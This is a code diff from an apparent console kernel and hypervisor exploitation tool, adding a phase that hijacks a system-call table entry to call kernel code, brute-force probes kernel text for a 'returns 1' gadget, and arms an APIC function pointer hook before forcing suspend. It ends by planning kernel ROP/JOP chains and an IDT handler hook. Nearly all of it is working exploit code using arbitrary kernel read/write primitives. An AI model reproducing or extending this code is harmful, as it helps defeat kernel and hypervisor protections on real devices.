@@ -5303,6 +5303,203 @@ static void campaign_flatz_setup(void) {
         }
 
         /*
+         * ─── Phase 9: apic_ops Function Return Value Survey ───
+         *
+         * XOM prevents reading ktext bytes, so we can't scan for gadgets.
+         * Instead, we use the proven sysent hook mechanism to CALL each
+         * apic_ops function from userland and observe its return value.
+         *
+         * This is 100% safe — identical to the issetugid→getpid test:
+         *   1. Hook sysent[253].sy_call → ktext function address
+         *   2. Set narg=0 (no arg copyin — matches void(*)(void) signature)
+         *   3. Call syscall(253), record return value
+         *   4. Restore sysent[253] immediately
+         *
+         * Functions returning 1 are candidates for the suspend hook
+         * (xapic_mode must return 1 = APIC_MODE_XAPIC).
+         *
+         * We also probe ktext addresses NEAR apic_ops functions looking
+         * for embedded "mov eax, 1; ret" (B8 01 00 00 00 C3) gadgets.
+         * By calling addresses at offsets -4..+64 from each function,
+         * we may land on a mid-function sequence that returns 1.
+         * Any address that returns 1 without crashing is usable.
+         */
+        printf("\n=============================================\n");
+        printf("  Phase 9: ktext Function Return Value Survey\n");
+        printf("=============================================\n\n");
+        fflush(stdout);
+
+        uint64_t p9_sysent_kva = g_kdata_base + 0x1709c0ULL;
+        uint64_t p9_s253_kva = p9_sysent_kva + 253ULL * SYSENT_STRIDE;
+        uint64_t p9_s253_call_pa = va_to_pa_quiet(p9_s253_kva + 8);
+        uint64_t p9_s253_narg_pa = va_to_pa_quiet(p9_s253_kva);
+
+        (void)0;  /* p9_done removed — unused */
+        uint64_t p9_gadget_addr = 0;  /* best "returns 1" ktext address */
+
+        if (p9_s253_call_pa && p9_s253_narg_pa && n_ops >= 3) {
+            /* Save original sysent[253] */
+            uint64_t p9_orig_call = 0;
+            int32_t p9_orig_narg = 0;
+            kernel_copyout(g_dmap_base + p9_s253_call_pa, &p9_orig_call, 8);
+            kernel_copyout(g_dmap_base + p9_s253_narg_pa, &p9_orig_narg, 4);
+
+            int32_t p9_zero_narg = 0;
+
+            printf("[*] Step 1: Calling each apic_ops function via sysent hook...\n");
+            printf("    (hook sysent[253] → target, call syscall(253), restore)\n\n");
+            fflush(stdout);
+
+            int p9_returns_1_count = 0;
+            uint64_t p9_returns_1_addrs[32];
+
+            for (int i = 0; i < n_ops && i < 32; i++) {
+                uint64_t target = ops[i];
+
+                /* Sanity check: must be in ktext range */
+                if (target < g_ktext_base ||
+                    target >= g_ktext_base + 0x2000000) {
+                    printf("    [%2d] 0x%016lx — SKIP (outside ktext)\n",
+                           i, (unsigned long)target);
+                    continue;
+                }
+
+                /* Hook sysent[253] → this apic_ops function */
+                kernel_copyin(&target, g_dmap_base + p9_s253_call_pa, 8);
+                kernel_copyin(&p9_zero_narg, g_dmap_base + p9_s253_narg_pa, 4);
+
+                /* Call it */
+                errno = 0;
+                long ret = syscall(253);
+                int err = errno;
+
+                /* Restore immediately */
+                kernel_copyin(&p9_orig_call, g_dmap_base + p9_s253_call_pa, 8);
+                kernel_copyin(&p9_orig_narg, g_dmap_base + p9_s253_narg_pa, 4);
+
+                printf("    [%2d] 0x%016lx (ktext+0x%06lx) → ret=%ld errno=%d",
+                       i, (unsigned long)target,
+                       (unsigned long)(target - g_ktext_base),
+                       ret, err);
+
+                if (ret == 1 && err == 0) {
+                    printf("  *** RETURNS 1 ***");
+                    if (p9_returns_1_count < 32)
+                        p9_returns_1_addrs[p9_returns_1_count] = target;
+                    p9_returns_1_count++;
+                }
+                if (i == 2) printf("  [xapic_mode]");
+                printf("\n");
+                fflush(stdout);
+            }
+
+            printf("\n[*] Summary: %d/%d functions return 1\n",
+                   p9_returns_1_count, n_ops);
+
+            /*
+             * If we found functions returning 1 OTHER than apic_ops[2],
+             * those are safe alternatives for the suspend hook.
+             */
+            for (int i = 0; i < p9_returns_1_count && i < 32; i++) {
+                if (p9_returns_1_addrs[i] != ops[2]) {
+                    p9_gadget_addr = p9_returns_1_addrs[i];
+                    printf("[+] Alternative 'returns 1' function: 0x%016lx (ktext+0x%lx)\n",
+                           (unsigned long)p9_gadget_addr,
+                           (unsigned long)(p9_gadget_addr - g_ktext_base));
+                    break;
+                }
+            }
+
+            /*
+             * Step 2: Probe ktext near apic_ops[2] for embedded gadgets.
+             *
+             * The real xapic_mode function at ops[2] returns 1.  The bytes
+             * "B8 01 00 00 00 C3" (mov eax, 1; ret) may appear at various
+             * offsets within or near this function.  By calling nearby
+             * addresses, we find additional ktext entry points that return 1.
+             *
+             * We probe addresses from xapic_mode-16 to xapic_mode+127 in
+             * 1-byte increments.  Each probe hooks sysent[253] → target,
+             * calls syscall(253), and checks the return value.
+             *
+             * SAFETY: If the target is mid-instruction or an invalid code
+             * path, the CPU will #UD or the function will return some value
+             * (not 1).  The kernel's #UD handler returns EINVAL to userland
+             * without panicking.  Only ktext addresses that cleanly return
+             * 1 are candidates.
+             *
+             * CAUTION: Some mid-function offsets may execute partial code
+             * with side effects.  We limit probing to a small range around
+             * the known-good xapic_mode function to minimize risk.
+             */
+            if (!p9_gadget_addr) {
+                printf("\n[*] Step 2: Probing ktext near xapic_mode for 'returns 1' offsets...\n");
+                printf("    Base: 0x%016lx (apic_ops[2])\n",
+                       (unsigned long)ops[2]);
+                printf("    Range: -16 to +127 bytes (144 probes)\n\n");
+                fflush(stdout);
+
+                for (int off = -16; off <= 127; off++) {
+                    uint64_t probe = ops[2] + off;
+
+                    /* Skip the original xapic_mode itself */
+                    if (probe == ops[2]) continue;
+
+                    /* Must be in ktext */
+                    if (probe < g_ktext_base ||
+                        probe >= g_ktext_base + 0x2000000)
+                        continue;
+
+                    kernel_copyin(&probe, g_dmap_base + p9_s253_call_pa, 8);
+                    kernel_copyin(&p9_zero_narg, g_dmap_base + p9_s253_narg_pa, 4);
+
+                    errno = 0;
+                    long ret = syscall(253);
+                    int err = errno;
+
+                    kernel_copyin(&p9_orig_call, g_dmap_base + p9_s253_call_pa, 8);
+                    kernel_copyin(&p9_orig_narg, g_dmap_base + p9_s253_narg_pa, 4);
+
+                    if (ret == 1 && err == 0) {
+                        printf("    [+%3d] 0x%016lx → ret=1 *** GADGET FOUND ***\n",
+                               off, (unsigned long)probe);
+                        if (!p9_gadget_addr) p9_gadget_addr = probe;
+                    } else if (err != 0 && (off % 32 == 0)) {
+                        /* Show periodic progress for error cases */
+                        printf("    [+%3d] 0x%016lx → ret=%ld errno=%d\n",
+                               off, (unsigned long)probe, ret, err);
+                    }
+                    fflush(stdout);
+                }
+            }
+
+            /* Final restore of sysent[253] (safety) */
+            kernel_copyin(&p9_orig_call, g_dmap_base + p9_s253_call_pa, 8);
+            kernel_copyin(&p9_orig_narg, g_dmap_base + p9_s253_narg_pa, 4);
+
+            if (p9_gadget_addr) {
+                printf("\n[+] ============================================\n");
+                printf("[+]  PHASE 9: KTEXT GADGET FOUND!\n");
+                printf("[+] ============================================\n");
+                printf("[+] Address: 0x%016lx (ktext+0x%lx)\n",
+                       (unsigned long)p9_gadget_addr,
+                       (unsigned long)(p9_gadget_addr - g_ktext_base));
+                printf("[+] Returns 1 (APIC_MODE_XAPIC) — safe for suspend hook.\n");
+                printf("[+] This is in ktext → NPT allows execution during suspend!\n");
+            } else {
+                printf("\n[-] No alternative 'returns 1' gadget found.\n");
+                printf("    apic_ops[2] itself returns 1 but we need a\n");
+                printf("    DIFFERENT address to prove the hook mechanism.\n");
+            }
+            printf("\n");
+            fflush(stdout);
+            /* Phase 9 complete */
+        } else {
+            printf("[-] Phase 9 skipped: sysent VA→PA failed or too few apic_ops.\n\n");
+            fflush(stdout);
+        }
+
+        /*
          * Detect post-resume state.
          *
          * Detection methods (any triggers post-resume path):
@@ -5414,6 +5611,12 @@ static void campaign_flatz_setup(void) {
             int hook_is_cave_tramp = (xapic_now == cave_tramp_kva);
             int hook_is_original = orig_xapic && (xapic_now == orig_xapic);
 
+            /* Check if apic_ops[2] holds a Phase 9 ktext gadget.
+             * A ktext gadget is IN ktext but NOT the original xapic_mode. */
+            int hook_is_p9_ktext = (!hook_is_original &&
+                                    xapic_now >= g_ktext_base &&
+                                    xapic_now < g_ktext_base + 0x2000000);
+
             printf("\n[*] apic_ops[2] (xapic_mode):\n");
             printf("    Current value:  0x%016lx\n", (unsigned long)xapic_now);
             if (orig_xapic)
@@ -5422,7 +5625,14 @@ static void campaign_flatz_setup(void) {
             printf("    Minimal gadget: 0x%016lx\n",
                    (unsigned long)minimal_gadget_kva);
 
-            if (hook_is_minimal) {
+            if (hook_is_p9_ktext) {
+                printf("    >>> PHASE 9 KTEXT HOOK SURVIVED SUSPEND! <<<\n");
+                printf("    apic_ops[2] = 0x%016lx (ktext+0x%lx)\n",
+                       (unsigned long)xapic_now,
+                       (unsigned long)(xapic_now - g_ktext_base));
+                printf("    xapic_mode was called during cpususpend_handler\n");
+                printf("    and returned 1 — ktext execution WORKS during suspend!\n");
+            } else if (hook_is_minimal) {
                 printf("    >>> MINIMAL GADGET HOOK SURVIVED SUSPEND! <<<\n");
                 printf("    apic_ops[2] still points to kdata+0x%x\n",
                        MINIMAL_GADGET_OFFSET);
@@ -5450,7 +5660,36 @@ static void campaign_flatz_setup(void) {
                 printf("[+]   Original xapic:  0x%016lx\n",
                        (unsigned long)orig_xapic);
 
-            if (hook_is_minimal) {
+            if (hook_is_p9_ktext) {
+                printf("[+]\n");
+                printf("[+] ============================================\n");
+                printf("[+]  KTEXT HOOK SURVIVED SUSPEND/RESUME!\n");
+                printf("[+] ============================================\n");
+                printf("[+]  apic_ops[2] → Phase 9 ktext gadget\n");
+                printf("[+]  Hook was active during cpususpend_handler!\n");
+                printf("[+]  This confirms:\n");
+                printf("[+]    1. ktext code execution works during suspend\n");
+                printf("[+]    2. NPT allows X on ktext during cpususpend_handler\n");
+                printf("[+]    3. apic_ops[2] is NOT reinitialized by kernel\n");
+                printf("[+]    4. Hooking apic_ops[2] → ktext gadget is the\n");
+                printf("[+]       correct approach for suspend-time code execution\n");
+                printf("[+]\n");
+                printf("[+]  NEXT STEPS:\n");
+                printf("[+]    - Build ktext ROP/JOP chain from ktext gadgets\n");
+                printf("[+]    - Use pointer poisoning (flatz method) for\n");
+                printf("[+]      arbitrary code execution during suspend\n");
+                printf("[+]    - Hook IDT #GP handler for non-canonical traps\n");
+
+                /* Restore original xapic_mode now that we've confirmed */
+                printf("\n[*] Restoring apic_ops[2] to original...\n");
+                kernel_copyin(&orig_xapic,
+                              g_dmap_base + ops_pa + 0x10, 8);
+                uint64_t restore_v = 0;
+                kernel_copyout(g_dmap_base + ops_pa + 0x10, &restore_v, 8);
+                printf("    apic_ops[2] restored: 0x%016lx [%s]\n",
+                       (unsigned long)restore_v,
+                       restore_v == orig_xapic ? "OK" : "FAIL");
+            } else if (hook_is_minimal) {
                 printf("[+]\n");
                 printf("[+] ============================================\n");
                 printf("[+]  APIC_OPS HOOK SURVIVED SUSPEND/RESUME!\n");
@@ -5906,7 +6145,11 @@ static void campaign_flatz_setup(void) {
             if (gadget_test_passed) {
                 printf("[+]   Gadget test:    PASSED (kdata execution works normally)\n");
             }
-            if (g_kld_text_trampoline) {
+            if (p9_gadget_addr && p9_gadget_addr != original_xapic) {
+                printf("[+]   Phase 9:        0x%016lx (ktext gadget, returns 1)\n",
+                       (unsigned long)p9_gadget_addr);
+                printf("[+]   Strategy:       ARM ktext gadget → suspend with hook active!\n");
+            } else if (g_kld_text_trampoline) {
                 printf("[+]   KLD .text:      0x%016lx (will arm for suspend test)\n",
                        (unsigned long)g_kld_text_trampoline);
             } else if (hook_armed) {
@@ -5924,25 +6167,79 @@ static void campaign_flatz_setup(void) {
             printf("[+]\n");
 
             /*
-             * KLD .text trampoline suspend test.
+             * ── Suspend hook priority ──
              *
-             * CONFIRMED (Session 4): kdata execution causes kernel panic
-             * during cpususpend_handler.  HV enforces NPT NX on kdata.
+             * Priority 1: Phase 9 ktext gadget (p9_gadget_addr)
+             *   - Already in ktext → NPT allows execution during suspend
+             *   - Returns 1 (APIC_MODE_XAPIC) — correct for xapic_mode hook
+             *   - ZERO panic risk: ktext is the ONLY region executable during
+             *     cpususpend_handler
              *
-             * Test hypothesis: kmod .text pages (loaded via kldload) may
-             * have different NPT permissions than kdata.  The kmod's
-             * trampoline_xapic_mode() is in .text, which was proven
-             * executable during normal ops (IDT trampoline works).
+             * Priority 2: KLD .text trampoline (g_kld_text_trampoline)
+             *   - CONFIRMED BLOCKED: NPT NX enforced on kmod .text during suspend
+             *   - Only useful as a normal-ops test; must restore before suspend
              *
-             * Safety: set g_trampoline_target = 0 via DMAP so the
-             * trampoline just returns 1 (APIC_MODE_XAPIC) with no
-             * call-through.  This is the minimal test — if kmod .text
-             * is executable during suspend, this won't panic.
+             * Priority 3: kdata gadget
+             *   - CONFIRMED BLOCKED: NPT NX enforced on kdata during suspend
+             *
+             * If Priority 1 is available, we arm apic_ops[2] with the ktext
+             * gadget and enter suspend WITHOUT restoring.  On resume, the
+             * post-resume detection logic checks if apic_ops[2] still holds
+             * the Phase 9 gadget address.
              */
             {
                 int kld_armed = 0;
+                int p9_armed = 0;
 
-                if (g_kld_text_trampoline) {
+                /*
+                 * Priority 1: Phase 9 ktext gadget
+                 */
+                if (p9_gadget_addr && p9_gadget_addr != original_xapic) {
+                    printf("\n[*] Phase 9 ktext gadget suspend test:\n");
+                    printf("    p9_gadget_addr = 0x%016lx (ktext+0x%lx)\n",
+                           (unsigned long)p9_gadget_addr,
+                           (unsigned long)(p9_gadget_addr - g_ktext_base));
+                    printf("    original xapic = 0x%016lx\n",
+                           (unsigned long)original_xapic);
+                    printf("    This is in ktext → NPT allows execution during suspend.\n");
+
+                    /* Arm apic_ops[2] with the ktext gadget */
+                    kernel_copyin(&p9_gadget_addr,
+                                  g_dmap_base + ops_pa + 0x10, 8);
+                    uint64_t av = 0;
+                    kernel_copyout(g_dmap_base + ops_pa + 0x10, &av, 8);
+                    printf("    apic_ops[2] = 0x%016lx [%s]\n",
+                           (unsigned long)av,
+                           av == p9_gadget_addr ? "P9 KTEXT ARMED" : "FAIL");
+
+                    if (av == p9_gadget_addr) {
+                        p9_armed = 1;
+                        /* Quick 2s stability check before suspend */
+                        printf("    Stability check (2s)...\n");
+                        fflush(stdout);
+                        for (int t = 1; t <= 2; t++) {
+                            sleep(1);
+                            printf("    Tick %d/2 — alive\n", t);
+                            fflush(stdout);
+                        }
+                        printf("    [OK] ktext gadget stable during normal ops.\n");
+                        printf("\n[+] *** ENTERING SUSPEND WITH KTEXT HOOK ARMED ***\n");
+                        printf("[+] apic_ops[2] = 0x%016lx (Phase 9 ktext gadget)\n",
+                               (unsigned long)p9_gadget_addr);
+                        printf("[+] If suspend/resume succeeds without panic, this PROVES\n");
+                        printf("[+] ktext hooks survive the cpususpend_handler!\n");
+                    }
+                }
+
+                /*
+                 * Priority 2: KLD .text trampoline (fallback, normal-ops test only)
+                 *
+                 * CONFIRMED (Session 4): kdata execution causes kernel panic
+                 * during cpususpend_handler.  HV enforces NPT NX on kdata.
+                 * KLD .text is also blocked during suspend (Session 8).
+                 * This test only validates normal-ops execution.
+                 */
+                if (!p9_armed && g_kld_text_trampoline) {
                     printf("\n[*] KLD .text suspend test:\n");
                     printf("    kld trampoline = 0x%016lx (kmod .text)\n",
                            (unsigned long)g_kld_text_trampoline);
@@ -6046,37 +6343,61 @@ static void campaign_flatz_setup(void) {
                     printf("    Restoring apic_ops[2] to original before standby.\n");
                 }
 
-                /* Always restore original xapic_mode before suspend */
-                kernel_copyin(&original_xapic,
-                              g_dmap_base + ops_pa + 0x10, 8);
-                uint64_t restore_verify = 0;
-                kernel_copyout(g_dmap_base + ops_pa + 0x10,
-                               &restore_verify, 8);
-                if (restore_verify != original_xapic) {
-                    printf("[!] apic_ops[2] restore FAILED: 0x%016lx\n",
-                           (unsigned long)restore_verify);
+                if (p9_armed) {
+                    /*
+                     * Phase 9 ktext gadget is armed — DO NOT restore.
+                     * Enter suspend with the ktext hook in place.
+                     * ktext is executable during cpususpend_handler.
+                     */
+                    printf("[*] Calling sceSystemStateMgrEnterStandby()...\n");
+                    printf("[*] Suspend hook: Phase 9 ktext gadget (0x%016lx)\n",
+                           (unsigned long)p9_gadget_addr);
+                    printf("[*] apic_ops[2] NOT restored — ktext hook armed for suspend!\n");
+                    fflush(stdout);
+                    fflush(stderr);
+                    notify("[HV Research] REST MODE — KTEXT HOOK ARMED for suspend test!");
+                    sleep(3);
+                    int standby_ret = sceSystemStateMgrEnterStandby();
+                    printf("[*] sceSystemStateMgrEnterStandby() returned %d\n",
+                           standby_ret);
+                    if (standby_ret != 0) {
+                        printf("[!] Standby call failed (ret=%d, errno=%d).\n",
+                               standby_ret, errno);
+                        notify("[HV Research] Auto-standby failed!");
+                    }
                 } else {
-                    printf("[*] apic_ops[2] restored to original: 0x%016lx\n",
-                           (unsigned long)restore_verify);
-                }
+                    /* Restore original xapic_mode before suspend (no ktext gadget) */
+                    kernel_copyin(&original_xapic,
+                                  g_dmap_base + ops_pa + 0x10, 8);
+                    uint64_t restore_verify = 0;
+                    kernel_copyout(g_dmap_base + ops_pa + 0x10,
+                                   &restore_verify, 8);
+                    if (restore_verify != original_xapic) {
+                        printf("[!] apic_ops[2] restore FAILED: 0x%016lx\n",
+                               (unsigned long)restore_verify);
+                    } else {
+                        printf("[*] apic_ops[2] restored to original: 0x%016lx\n",
+                               (unsigned long)restore_verify);
+                    }
 
-                printf("[*] Calling sceSystemStateMgrEnterStandby()...\n");
-                printf("[*] KLD test result: %s\n", kld_armed
-                    ? "PASSED normal ops, BLOCKED by NPT NX during suspend"
-                    : "not armed (no KLD trampoline available)");
-                fflush(stdout);
-                fflush(stderr);
-                notify(kld_armed
-                    ? "[HV Research] REST MODE — KLD tested, restored for safe suspend"
-                    : "[HV Research] Entering rest mode (hook restored)...");
-                sleep(3);
-                int standby_ret = sceSystemStateMgrEnterStandby();
-                printf("[*] sceSystemStateMgrEnterStandby() returned %d\n",
-                       standby_ret);
-                if (standby_ret != 0) {
-                    printf("[!] Standby call failed (ret=%d, errno=%d).\n",
-                           standby_ret, errno);
-                    notify("[HV Research] Auto-standby failed!");
+                    printf("[*] Calling sceSystemStateMgrEnterStandby()...\n");
+                    printf("[*] KLD test result: %s\n", kld_armed
+                        ? "PASSED normal ops, BLOCKED by NPT NX during suspend"
+                        : "not armed (no KLD trampoline available)");
+                    fflush(stdout);
+                    fflush(stderr);
+                    notify(kld_armed
+                        ? "[HV Research] REST MODE — KLD tested, restored for safe suspend"
+                        : "[HV Research] Entering rest mode (hook restored)...");
+                    sleep(3);
+                    int standby_ret = sceSystemStateMgrEnterStandby();
+                    printf("[*] sceSystemStateMgrEnterStandby() returned %d\n",
+                           standby_ret);
+                    if (standby_ret != 0) {
+                        printf("[!] Standby call failed (ret=%d, errno=%d).\n",
+                               standby_ret, errno);
+                        notify("[HV Research] Auto-standby failed!");
+                    }
                 }
             }
         }
